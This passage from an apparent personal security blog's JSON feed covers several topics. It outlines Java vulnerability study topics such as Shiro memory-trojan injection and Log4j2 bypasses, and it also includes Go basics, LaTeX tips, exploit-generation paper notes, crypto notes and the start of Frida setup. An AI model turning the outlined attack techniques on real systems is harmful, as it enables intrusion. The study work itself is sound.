class=\"headerlink\" title=\"weblogic\"></a>weblogic</h3><ul>\n<li>反序列化漏洞</li>\n<li>二次反序列化</li>\n<li>14882绕过</li>\n<li>XML Decoder绕过</li>\n<li>IIOP/T3</li>\n<li>文件上传</li>\n</ul>\n<h3 id=\"XStream-x2F-jackson\"><a href=\"#XStream-x2F-jackson\" class=\"headerlink\" title=\"XStream/jackson\"></a>XStream/jackson</h3><ul>\n<li>历史上有很多的Gadget，如何去找新的Gadget</li>\n</ul>\n<h3 id=\"Hessian\"><a href=\"#Hessian\" class=\"headerlink\" title=\"Hessian\"></a>Hessian</h3><ul>\n<li>Apache dubbo历史上的漏洞</li>\n</ul>\n<h3 id=\"SnakeYAML\"><a href=\"#SnakeYAML\" class=\"headerlink\" title=\"SnakeYAML\"></a>SnakeYAML</h3><ul>\n<li>如何利用，如何修复，如何审计</li>\n</ul>\n<h3 id=\"shiro（重点）\"><a href=\"#shiro（重点）\" class=\"headerlink\" title=\"shiro（重点）\"></a>shiro（重点）</h3><ul>\n<li>经典的RCE</li>\n<li>shiro 721 Padding Oracle</li>\n<li>如何检测（SimplePrincipalCollection）</li>\n<li>如何自己写利用工具</li>\n<li>如何通过Shiro注入内存木马</li>\n<li>修改KEY</li>\n<li>请求头过大的限制方法</li>\n<li>请求头长度严格限制的情况下如何绕过</li>\n<li>Nginx反向代理和负载均衡下的问题解决</li>\n</ul>\n<h3 id=\"structs2\"><a href=\"#structs2\" class=\"headerlink\" title=\"structs2\"></a>structs2</h3><ul>\n<li>ognl漏洞</li>\n</ul>\n<h3 id=\"Spring\"><a href=\"#Spring\" class=\"headerlink\" title=\"Spring\"></a>Spring</h3><ul>\n<li>Spring RCE分析</li>\n<li>Spring EL相关漏洞</li>\n<li>Springboot</li>\n</ul>\n<h3 id=\"Log4j2\"><a href=\"#Log4j2\" class=\"headerlink\" title=\"Log4j2\"></a>Log4j2</h3><ul>\n<li>最初版RCERC1的绕过</li>\n<li>拒绝服务原理</li>\n<li>Java Agent修复原理</li>\n</ul>\n<h3 id=\"Tomcat\"><a href=\"#Tomcat\" class=\"headerlink\" title=\"Tomcat\"></a>Tomcat</h3><ul>\n<li>PUT RCE</li>\n<li>CGI SERVERLET RCE</li>\n<li>SESSION RCE</li>\n<li>AJP RCE</li>\n</ul>\n",
            "tags": [
                "java"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2024/01/28/golang-ji-chu/",
            "url": "https://alazymechnaic.github.io/2024/01/28/golang-ji-chu/",
            "title": "Golang基础",
            "date_published": "2024-01-28T01:33:23.000Z",
            "content_html": "<h1 id=\"Go-语言安全实战\"><a href=\"#Go-语言安全实战\" class=\"headerlink\" title=\"Go 语言安全实战\"></a>Go 语言安全实战</h1><hr>\n<h2 id=\"Go语言编程\"><a href=\"#Go语言编程\" class=\"headerlink\" title=\"Go语言编程\"></a>Go语言编程</h2><h3 id=\"基础语法\"><a href=\"#基础语法\" class=\"headerlink\" title=\"基础语法\"></a>基础语法</h3><p>go语言本身是编译型语言，具备高效、简洁、并发能力强的特点，因此常常被用于云计算、网络服务。Go语言在执行的过程中，将Go代码转化为中间表示，并将程序的中间表示转化为目标平台的机器码。</p>\n<h4 id=\"hello-world\"><a href=\"#hello-world\" class=\"headerlink\" title=\"hello world\"></a>hello world</h4><figure class=\"highlight go\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs go\"><span class=\"hljs-keyword\">package</span> main<br><span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">\"fmt\"</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">func</span> <span class=\"hljs-title\">main</span><span class=\"hljs-params\">()</span></span> {<br>    fmt.Printf(<span class=\"hljs-string\">\"Congratulations! Go has successfully been installed on your system\\n\"</span>)<br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<p>运行代码</p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">go run hello.go <br></code></pre></td></tr></tbody></table></figure>\n\n<p>拆分过程后进行代码的运行</p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">go build -x hello.go  <span class=\"hljs-comment\"># 拆分过程实现，会产生一个名称为hello的二进制文件</span><br></code></pre></td></tr></tbody></table></figure>\n\n<p>通过gdb调试二进制文件能够看到go产生的中间语言。go语言在运行的过程中通过go的runtime与内核进行通信，runtime完成包括内存的分配等操作。</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202402281041471.png\" alt=\"image-20240228104124390\"></p>\n<p>Go程序首次进入的函数是runtime.rt0_amd64，通过runtime.rt0_go函数调用main函数，并完成数据变量的初始化，CPU核心数量的获取以及全局变量m0、g0的设置。而后m0开启第一个线程。Go语言的runtime中存在优秀的线程管理机制，</p>\n<ul>\n<li>G：goroutine，⼀个计算任务。由需要执⾏的代码和其上下⽂组成，上下⽂包括：当前代码位置，栈顶、栈底地址，状态等。（协程）</li>\n<li>M：machine，系统线程，执⾏实体，想要在 CPU 上执⾏代码，必须有线程，与 C 语⾔中的线程相同，通过系统调⽤ clone 来创建。</li>\n<li>P：processor，虚拟处理器，M 必须获得 P 才能执⾏代码，否则必须陷⼊休眠(后台监控线程除外)，你也可以将其理解为⼀种 token，有这个 token，才有在物理 CPU 核⼼上执⾏的权⼒。</li>\n</ul>\n<p><a href=\"https://blog.csdn.net/qq_41000891/article/details/120463494\">https://blog.csdn.net/qq_41000891/article/details/120463494</a></p>\n<ul>\n<li>go语言的包声明和引入包有什么区别？</li>\n</ul>\n<p>go语言中的每一程序都至少包含一个名为main的包。并且package main必须在文件的第一个非注释行出现，表示该文件是程序的主函数。</p>\n<ul>\n<li>后面的为什么还要有一个main？</li>\n</ul>\n<p>package main用于指定程序首先寻找的文件，func main则用于指定首次执行的函数，如果存在init函数，则先执行init函数。</p>\n<h4 id=\"变量声明\"><a href=\"#变量声明\" class=\"headerlink\" title=\"变量声明\"></a>变量声明</h4><figure class=\"highlight go\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs go\"><span class=\"hljs-keyword\">var</span> age <span class=\"hljs-type\">int</span>;<br>age = <span class=\"hljs-number\">2</span><br><span class=\"hljs-comment\">//</span><br><span class=\"hljs-keyword\">var</span> age = <span class=\"hljs-number\">2</span><br><span class=\"hljs-comment\">//</span><br>age := <span class=\"hljs-number\">2</span><br></code></pre></td></tr></tbody></table></figure>\n\n<p>以上三种做法都可以实现对变量的声明。</p>\n<h4 id=\"指针操作\"><a href=\"#指针操作\" class=\"headerlink\" title=\"指针操作\"></a>指针操作</h4><figure class=\"highlight go\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs go\"><span class=\"hljs-keyword\">package</span> main<br><span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">\"fmt\"</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">func</span> <span class=\"hljs-title\">change</span><span class=\"hljs-params\">(v *<span class=\"hljs-type\">int</span>)</span></span> {<br>    *v = <span class=\"hljs-number\">40</span><br>}<br><span class=\"hljs-function\"><span class=\"hljs-keyword\">func</span> <span class=\"hljs-title\">main</span><span class=\"hljs-params\">()</span></span> {<br>    a := <span class=\"hljs-number\">50</span> <span class=\"hljs-comment\">// 声明变量 a</span><br>    b := &amp;a <span class=\"hljs-comment\">// 产生一个指向a的指针b</span><br>    change(b) <span class=\"hljs-comment\">// 修改b指向内容的数据</span><br>    fmt.Println(a) <span class=\"hljs-comment\">// 40</span><br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<p>在go语言中的指针操作与C语言类似，可以通过:=符号完成对变量的简单声明一个指针类型的变量。</p>\n<figure class=\"highlight go\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs go\"><span class=\"hljs-keyword\">package</span> main<br><br><span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">\"fmt\"</span><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">func</span> <span class=\"hljs-title\">change</span><span class=\"hljs-params\">(v *<span class=\"hljs-type\">int</span>)</span></span> {<br>    *v = <span class=\"hljs-number\">40</span><br>}<br><span class=\"hljs-function\"><span class=\"hljs-keyword\">func</span> <span class=\"hljs-title\">main</span><span class=\"hljs-params\">()</span></span> {<br>\t<span class=\"hljs-keyword\">var</span>(<br>\ta = [<span class=\"hljs-number\">3</span>]<span class=\"hljs-type\">int</span>{<span class=\"hljs-number\">10</span>,<span class=\"hljs-number\">20</span>,<span class=\"hljs-number\">30</span>}<br>\tptr [<span class=\"hljs-number\">3</span>]*<span class=\"hljs-type\">int</span><br>\t)<br><br><span class=\"hljs-keyword\">for</span> i := <span class=\"hljs-number\">0</span>; i&lt;<span class=\"hljs-built_in\">len</span>(a); i ++{<br>\tptr[i] = &amp;a[i]<br>\tfmt.Printf(<span class=\"hljs-string\">\"%d 0x%x\\n\"</span>,i+<span class=\"hljs-number\">1</span>, ptr[i])<br>}<br>fmt.Println(ptr[<span class=\"hljs-number\">0</span>]+<span class=\"hljs-number\">1</span>) <span class=\"hljs-comment\">// 报错：invalid operation: ptr[0] + 1 (mismatched types *int and int)</span><br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<p>在上述过程中能够看到，Go语言只能对程序中的int*类型的变量做解引用操作，且与C语言不同，指针本身并不能像数值一样直接运算。</p>\n<figure class=\"highlight go\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs go\"><span class=\"hljs-keyword\">package</span> main<br><br><span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">\"fmt\"</span><br><span class=\"hljs-comment\">// import \"unsafe\"</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">func</span> <span class=\"hljs-title\">change</span><span class=\"hljs-params\">(v *<span class=\"hljs-type\">int</span>)</span></span> {<br>    *v = <span class=\"hljs-number\">40</span><br>}<br><span class=\"hljs-function\"><span class=\"hljs-keyword\">func</span> <span class=\"hljs-title\">main</span><span class=\"hljs-params\">()</span></span> {<br>\t<span class=\"hljs-keyword\">var</span>(<br>\ta = [<span class=\"hljs-number\">3</span>]<span class=\"hljs-type\">int</span>{<span class=\"hljs-number\">10</span>,<span class=\"hljs-number\">20</span>,<span class=\"hljs-number\">30</span>}<br>\tptr [<span class=\"hljs-number\">3</span>]*<span class=\"hljs-type\">int</span><br>\t)<br><br><span class=\"hljs-keyword\">for</span> i := <span class=\"hljs-number\">0</span>; i&lt;<span class=\"hljs-built_in\">len</span>(a); i ++{<br>\tptr[i] = &amp;a[i]<br>\tfmt.Printf(<span class=\"hljs-string\">\"%d 0x%x\\n\"</span>,i+<span class=\"hljs-number\">1</span>, ptr[i])<br>}<br>fmt.Println(*ptr[<span class=\"hljs-number\">0</span>])<br>intVal := <span class=\"hljs-type\">int</span>(<span class=\"hljs-type\">uintptr</span>(unsafe.Pointer(ptr[<span class=\"hljs-number\">0</span>])))<br>intVal += <span class=\"hljs-number\">8</span><br>ptr2 := (*<span class=\"hljs-type\">int</span>)(unsafe.Pointer(<span class=\"hljs-type\">uintptr</span>(intVal)))<br>fmt.Println(*(ptr2)) <span class=\"hljs-comment\">// 报错 unsafe</span><br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<p>由于Go语言的特性，直接读取给定地址的内容是不允许的，因为Go语言具有内存安全性和类型安全性的限制。Go语言的内存访问是受限制的，不能直接操纵指针或进行低级别的内存操作。直接将数字转化为指针是不安全的，因此编译都不会通过。</p>\n<h2 id=\"Go语言的安全问题\"><a href=\"#Go语言的安全问题\" class=\"headerlink\" title=\"Go语言的安全问题\"></a>Go语言的安全问题</h2><p><a href=\"https://tyskill.github.io/posts/gossti/\">https://tyskill.github.io/posts/gossti/</a></p>\n<p><a href=\"https://bycsec.top/2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/\">https://bycsec.top/2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</a></p>\n<p><a href=\"https://xz.aliyun.com/t/13674?time__1311=mqmxnQ0QeDqGuD05d4+xCqklWoqxAK5x&amp;alichlgref=https://www.google.com.hk/\">https://xz.aliyun.com/t/13674?time__1311=mqmxnQ0QeDqGuD05d4%2BxCqklWoqxAK5x&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F</a></p>\n<h3 id=\"模板注入\"><a href=\"#模板注入\" class=\"headerlink\" title=\"模板注入\"></a>模板注入</h3><h3 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h3><h3 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h3><h3 id=\"任意文件读取\"><a href=\"#任意文件读取\" class=\"headerlink\" title=\"任意文件读取\"></a>任意文件读取</h3><h2 id=\"漏洞参考网站\"><a href=\"#漏洞参考网站\" class=\"headerlink\" title=\"漏洞参考网站\"></a>漏洞参考网站</h2><p><a href=\"https://pkg.go.dev/vuln/list\">https://pkg.go.dev/vuln/list</a></p>\n",
            "tags": [
                "go"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2024/01/07/overleaf-shi-yong-ji-qiao/",
            "url": "https://alazymechnaic.github.io/2024/01/07/overleaf-shi-yong-ji-qiao/",
            "title": "overleaf使用技巧",
            "date_published": "2024-01-07T07:52:13.000Z",
            "content_html": "<h1 id=\"Overleaf\"><a href=\"#Overleaf\" class=\"headerlink\" title=\"Overleaf\"></a>Overleaf</h1><hr>\n<h2 id=\"表格\"><a href=\"#表格\" class=\"headerlink\" title=\"表格\"></a>表格</h2><p>插入表格并且让其占据两栏</p>\n<figure class=\"highlight latex\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs latex\"><span class=\"hljs-keyword\">\\usepackage</span>{stfloats}<br><span class=\"hljs-keyword\">\\begin</span>{table*}[ht]<br>    <span class=\"hljs-comment\">% 插入长度为5pt的垂直空间（也可以是负数，缩进）</span><br>    <span class=\"hljs-keyword\">\\vspace</span>{5pt}<br>    <span class=\"hljs-keyword\">\\centering</span><br>    <span class=\"hljs-comment\">% 表名 前面为中文名/后面为英文名</span><br>    <span class=\"hljs-keyword\">\\caption</span>{Total Number Display Table}<br>    <span class=\"hljs-comment\">% label标签，用以引用本表时。例：autoref{num}</span><br>    <span class=\"hljs-keyword\">\\label</span>{num}<br>    <span class=\"hljs-comment\">% 设置表格单元格的列宽</span><br>    <span class=\"hljs-keyword\">\\setlength</span>{<span class=\"hljs-keyword\">\\tabcolsep</span>}{6mm}{<br>    <span class=\"hljs-comment\">% 表示 三线表 有4列</span><br>    <span class=\"hljs-keyword\">\\begin</span>{tabular}{cccc}<br>    <span class=\"hljs-comment\">% toprule表示三线表的顶部线</span><br>        <span class=\"hljs-keyword\">\\toprule</span><br>        Program <span class=\"hljs-built_in\">&amp;</span> CVE <span class=\"hljs-built_in\">&amp;</span> Primitive Location  <span class=\"hljs-built_in\">&amp;</span> Number of Tainted instructions <span class=\"hljs-keyword\">\\\\</span><br>        <span class=\"hljs-comment\">% midrule 表示 三线表的 中部线</span><br>        <span class=\"hljs-keyword\">\\midrule</span><br>        <span class=\"hljs-comment\">% 合并三行1列，用空格代替，也可以用\\multirow{}[]{}{}来表示</span><br>        <span class=\"hljs-keyword\">\\textbf</span>{Gstreamer}  <span class=\"hljs-built_in\">&amp;</span> b  <span class=\"hljs-built_in\">&amp;</span> 10   <span class=\"hljs-built_in\">&amp;</span> b <span class=\"hljs-keyword\">\\\\</span><br>        <span class=\"hljs-keyword\">\\textbf</span>{ }    <span class=\"hljs-built_in\">&amp;</span> 1   <span class=\"hljs-built_in\">&amp;</span> 1   <span class=\"hljs-built_in\">&amp;</span> 1   <span class=\"hljs-keyword\">\\\\</span><br>        <span class=\"hljs-keyword\">\\textbf</span>{ }    <span class=\"hljs-built_in\">&amp;</span> 1    <span class=\"hljs-built_in\">&amp;</span> 1   <span class=\"hljs-built_in\">&amp;</span> 1   <span class=\"hljs-keyword\">\\\\</span><br>   <br>        <span class=\"hljs-keyword\">\\textbf</span>{latex2rtf}  <span class=\"hljs-built_in\">&amp;</span> 1     <span class=\"hljs-built_in\">&amp;</span> 2  <span class=\"hljs-built_in\">&amp;</span> 1  <span class=\"hljs-keyword\">\\\\</span><br>        <span class=\"hljs-keyword\">\\textbf</span>{ }    <span class=\"hljs-built_in\">&amp;</span> 1       <span class=\"hljs-built_in\">&amp;</span> 3  <span class=\"hljs-built_in\">&amp;</span> 1  <span class=\"hljs-keyword\">\\\\</span><br>        <span class=\"hljs-keyword\">\\textbf</span>{ }    <span class=\"hljs-built_in\">&amp;</span> 1       <span class=\"hljs-built_in\">&amp;</span> 1  <span class=\"hljs-built_in\">&amp;</span> 1   <span class=\"hljs-keyword\">\\\\</span>  <br>        <span class=\"hljs-keyword\">\\textbf</span>{ }    <span class=\"hljs-built_in\">&amp;</span> 1       <span class=\"hljs-built_in\">&amp;</span> 1  <span class=\"hljs-built_in\">&amp;</span> 1   <span class=\"hljs-keyword\">\\\\</span> <br>    <br>        <span class=\"hljs-keyword\">\\textbf</span>{nginx}  <span class=\"hljs-built_in\">&amp;</span> 1     <span class=\"hljs-built_in\">&amp;</span> 30   <span class=\"hljs-built_in\">&amp;</span> 1   <span class=\"hljs-keyword\">\\\\</span>  <br>        <span class=\"hljs-keyword\">\\textbf</span>{ }    <span class=\"hljs-built_in\">&amp;</span> 1   <span class=\"hljs-built_in\">&amp;</span> 50   <span class=\"hljs-built_in\">&amp;</span> 1  <span class=\"hljs-keyword\">\\\\</span><br>        <span class=\"hljs-keyword\">\\textbf</span>{ }    <span class=\"hljs-built_in\">&amp;</span> 1     <span class=\"hljs-built_in\">&amp;</span> 100  <span class=\"hljs-built_in\">&amp;</span> 1 <span class=\"hljs-keyword\">\\\\</span><br>        <span class=\"hljs-keyword\">\\textbf</span>{ }    <span class=\"hljs-built_in\">&amp;</span> 1     <span class=\"hljs-built_in\">&amp;</span> 80   <span class=\"hljs-built_in\">&amp;</span> 1  <span class=\"hljs-keyword\">\\\\</span><br>        <span class=\"hljs-keyword\">\\textbf</span>{ }    <span class=\"hljs-built_in\">&amp;</span> 1     <span class=\"hljs-built_in\">&amp;</span> 40   <span class=\"hljs-built_in\">&amp;</span> 1  <span class=\"hljs-keyword\">\\\\</span><br>        <br>        <span class=\"hljs-keyword\">\\textbf</span>{ALL}       <span class=\"hljs-built_in\">&amp;</span> dd      <span class=\"hljs-built_in\">&amp;</span> dd     <span class=\"hljs-built_in\">&amp;</span> ddd <span class=\"hljs-keyword\">\\\\</span><br>        <span class=\"hljs-comment\">% bottomrule表示 三线表 的底部线</span><br>        <span class=\"hljs-keyword\">\\bottomrule</span> <br>    <span class=\"hljs-keyword\">\\end</span>{tabular}}<br><span class=\"hljs-keyword\">\\end</span>{table*}<br></code></pre></td></tr></tbody></table></figure>\n\n",
            "tags": [
                "writing"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/12/03/lun-wen-yue-du-bi-ji-tunter-assessing-exploitability-of-vulnerabilities-with-taint-guided-exploitable-states-exploration/",
            "url": "https://alazymechnaic.github.io/2023/12/03/lun-wen-yue-du-bi-ji-tunter-assessing-exploitability-of-vulnerabilities-with-taint-guided-exploitable-states-exploration/",
            "title": "论文阅读笔记：Tunter Assessing Exploitability of Vulnerabilities with Taint-Guided Exploitable States Exploration",
            "date_published": "2023-12-03T05:15:08.000Z",
            "content_html": "<h2 id=\"Tunter-Assessing-Exploitability-of-Vulnerabilities-with-Taint-Guided-Exploitable-States-Exploration\"><a href=\"#Tunter-Assessing-Exploitability-of-Vulnerabilities-with-Taint-Guided-Exploitable-States-Exploration\" class=\"headerlink\" title=\"Tunter: Assessing Exploitability of Vulnerabilities with Taint-Guided Exploitable States Exploration\"></a>Tunter: Assessing Exploitability of Vulnerabilities with Taint-Guided Exploitable States Exploration</h2><hr>\n<h3 id=\"主要贡献点\"><a href=\"#主要贡献点\" class=\"headerlink\" title=\"主要贡献点\"></a>主要贡献点</h3><ul>\n<li>基于污点分析的候选exploit状态探索策略</li>\n<li>用户缓解搜索状态爆照的剪枝策略</li>\n<li><strong>在14个CTF上，2个real world上测试</strong>，在Revery上的测试比其更快但是并没有找全面</li>\n</ul>\n<h3 id=\"关键思想\"><a href=\"#关键思想\" class=\"headerlink\" title=\"关键思想\"></a>关键思想</h3><ul>\n<li>一旦发生内存错误就会导致程序变为一个奇怪的状态机，发现exploit的本质是搜索这个状态机中的空间，<strong>但是搜索这该状态空间是十分耗时的</strong></li>\n<li>文章指出的问题<ul>\n<li>使用符号执行进行求解只能对小型的程序起作用，对于大一点的程序会直接路径爆炸（<strong>但是这个我们解决了，使用启发式的路径探索策略，有目标的进行探索和评估</strong></li>\n<li>对于fuzz的使用，Revery使用fuzz的方式进行可利用状态的探索，太耗时</li>\n</ul>\n</li>\n<li>使用启发式的状态剪枝方法来防止状态爆炸，构造目标可利用状态的约束</li>\n</ul>\n<h3 id=\"相似之处\"><a href=\"#相似之处\" class=\"headerlink\" title=\"相似之处\"></a>相似之处</h3><ul>\n<li>都是使用污点分析标记受污染的内存，在传播的过程中找到受影响的sink（例如，memcpy参数，ret地址等），作为候选的状态</li>\n<li>使用动静转换策略，找到程序漏洞的触发位置，将动态执行的状态转换为静态执行的状态，从静态位置开始进行污点分析，<strong>这一部分与我们的方法一致</strong>，但是并没有完全的dump内存，而是模拟了一个相似的静态程序状态</li>\n<li>数据流分析时的指针问题，因为rax可控，所以直接将rsi定义为可控，在下面的指令中mov [rsi],rbx就认为是个gadget，<strong>我们也是这么做的。。。，但是不同之处在于后续进行求解的过程中会在数据流分析中施加内存搜索策略</strong><ul>\n<li><img src=\"/paper-tunter.assets/image-20231203144731837.png\" alt=\"image-20231203144731837\"></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"主要的问题\"><a href=\"#主要的问题\" class=\"headerlink\" title=\"主要的问题\"></a>主要的问题</h3><ul>\n<li><p>所有的案例都是在CTF上进行实现，两个真实世界的案例，构造了一个Revery无法进行实现的案例的exp，且多数攻击都是通过改变控制流实现的，</p>\n</li>\n<li><p>行文中更多的是像对Revery研究的补充，而并非是一篇独立的文章，并且在比较结果上并没有比Revery好多少</p>\n</li>\n<li><p>文章对漏洞的理解，将内存错误视为对程序原有状态机的改变，我们认为内存错误的本质是对合法数据流依赖关系的破坏</p>\n</li>\n<li><p>文章中通过控制流劫持的方法进行攻击，我们使用的是满足控制流完整性的方式进行攻击，限制条件更多，<strong>后面的实验最好能找到原本没有，算法构造出的</strong></p>\n</li>\n<li><p>污点分析找路径时的爆炸问题并没有进行考虑，而我们使用启发式的路径排序策略，缓解了这一问题（他是用修剪不相关路径实现的？</p>\n</li>\n<li><p><strong>符号执行的路径修剪策略潦草</strong>：其实就是在指定了路径后去求解，出现循环太多次的就剪掉，这一部分工程实现讲得有点多</p>\n</li>\n<li><p>调研量过少，涉及到的AEG部分内容理解不完善</p>\n</li>\n<li><p><strong>我们的优势在于保证所有保护开启的情况下完成的攻击，该文章则是在保护全关的情况下进行利用</strong></p>\n</li>\n<li><p>对于精准的内存地址，没有办法做到求解，page 9</p>\n<ul>\n<li><img src=\"/paper-tunter.assets/image-20231203150112918.png\" alt=\"image-20231203150112918\"></li>\n</ul>\n</li>\n<li><p>angr的求解问题，并不能做到精准的求解</p>\n<ul>\n<li><img src=\"/paper-tunter.assets/image-20231203150421157.png\" alt=\"image-20231203150421157\"></li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "paper"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/10/17/mi-ma-xue-ji-chu/",
            "url": "https://alazymechnaic.github.io/2023/10/17/mi-ma-xue-ji-chu/",
            "title": "密码学基础",
            "date_published": "2023-10-17T07:58:44.000Z",
            "content_html": "<h3 id=\"双线性对的概念\"><a href=\"#双线性对的概念\" class=\"headerlink\" title=\"双线性对的概念\"></a>双线性对的概念</h3><p>​\t<strong>群</strong>：</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202310171559441.png\" alt=\"image-20231017155853356\"></p>\n<p>​\t关于群的<strong>阶数</strong>，其实就是群的个数：</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202310171601969.png\" alt=\"image-20231017160100932\"></p>\n<p>​\t<strong>生成元</strong>：生成元能够不断对自己做群中所定义的运算最终生成群中的任意一个元素。</p>\n<p>​\t<strong>线性空间</strong>：</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202310171610549.png\" alt=\"image-20231017161030484\"></p>\n<p>​\t<strong>双线性函数</strong>的定义：</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202310171608972.png\" alt=\"image-20231017160834934\"></p>\n",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2023/10/03/frida-hook/",
            "url": "https://alazymechnaic.github.io/2023/10/03/frida-hook/",
            "title": "frida-hook",
            "date_published": "2023-10-03T11:03:18.000Z",
            "content_html": "<h1 id=\"Frida-hook实战\"><a href=\"#Frida-hook实战\" class=\"headerlink\" title=\"Frida hook实战\"></a>Frida hook实战</h1><hr>\n<p>本文记录frida在Windows上的使用过程。代码出处位于参考链接中。</p>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><p>安装Python的frida模块：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">pip install frida-tools<br>pip install frida<br></code></pre></td></tr></tbody></table></figure>\n\n<p>首先下载frida的server：<a href=\"https://github.com/frida/frida/releases/download/16.1.4/frida-server-16.1.4-android-x86_64.xz\">https://github.com/frida/frida/releases/download/16.1.4/frida-server-16.1.4-android-x86_64.xz</a></p>\n<p>安装frida-server</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">adb push frida-server /data/local/tmp/frida-server<br>adb shell chmod 777 /data/local/tmp/frida-server\t<br><span class=\"hljs-meta prompt_\"># </span><span 